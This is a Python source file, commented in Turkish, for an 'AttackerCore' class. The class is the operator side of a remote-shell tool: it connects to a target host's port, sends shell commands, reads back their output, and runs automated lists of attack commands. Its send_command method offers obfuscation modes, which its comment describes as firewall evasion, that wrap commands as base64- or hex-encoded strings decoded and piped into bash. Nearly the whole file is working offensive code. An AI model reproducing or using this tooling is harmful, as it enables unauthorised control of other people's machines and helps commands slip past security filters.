import socket
import threading
import time
import base64

class AttackerCore:
    def __init__(self, on_receive_callback, on_disconnect_callback):
        self.on_receive_callback = on_receive_callback
        self.on_disconnect_callback = on_disconnect_callback
        
        self.sock = None
        self.connected = False
        
        # YENİ: Varsayılan komut gönderme formatı
        self.encoding_mode = "plain" # Seçenekler: plain, base64, hex

    # YENİ: Timeout parametresi eklendi
    def connect(self, ip, port, timeout=3.0):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(timeout) 
            self.sock.connect((ip, int(port)))
            self.sock.settimeout(None) 
            self.connected = True
            
            threading.Thread(target=self._receive_data, daemon=True).start()
            return True, f"Bağlantı başarılı. Port {port} açık."
            
        except ConnectionRefusedError:
            self.connected = False
            if self.sock: self.sock.close()
            return False, f"HEDEF KAPALI: {port} portunda dinleyen hiçbir servis yok."
            
        except socket.timeout:
            self.connected = False
            if self.sock: self.sock.close()
            return False, f"ZAMAN AŞIMI: {port} portuna ulaşılamıyor."
            
        except Exception as e:
            self.connected = False
            if self.sock: self.sock.close()
            return False, f"BAĞLANTI HATASI: {str(e)}"

    def disconnect(self):
        if self.connected and self.sock:
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
                self.sock.close()
            except: pass
        self.connected = False
        self.on_disconnect_callback()

    # YENİ: Komut formatını değiştirme
    def set_encoding(self, mode):
        if mode in ["plain", "base64", "hex"]:
            self.encoding_mode = mode

    def send_command(self, cmd):
        if not self.connected or not self.sock:
            return

        try:
            # YENİ: Güvenlik duvarı atlatma taklidi (Obfuscation)
            if self.encoding_mode == "base64":
                b64_cmd = base64.b64encode(cmd.encode()).decode()
                cmd = f"echo {b64_cmd} | base64 -d | bash"
            elif self.encoding_mode == "hex":
                hex_cmd = cmd.encode().hex()
                cmd = f"echo '{hex_cmd}' | xxd -r -p | bash"
            
            self.sock.sendall((cmd + "\n").encode('utf-8'))
        except:
            self.disconnect()

    # YENİ: Otomatik saldırı dizisi yürütme
    def run_automated_payload(self, payload_list, delay=1.0):
        """Verilen komut listesini belirtilen gecikmeyle sırayla çalıştırır."""
        def _execute():
            for cmd in payload_list:
                if not self.connected:
                    break
                self.send_command(cmd)
                time.sleep(delay)
                
        if self.connected:
            threading.Thread(target=_execute, daemon=True).start()

    def _receive_data(self):
        while self.connected:
            try:
                data = self.sock.recv(4096)
                if not data: break
                
                self.on_receive_callback(data.decode('utf-8', errors='replace'))
            except: 
                break
        self.disconnect()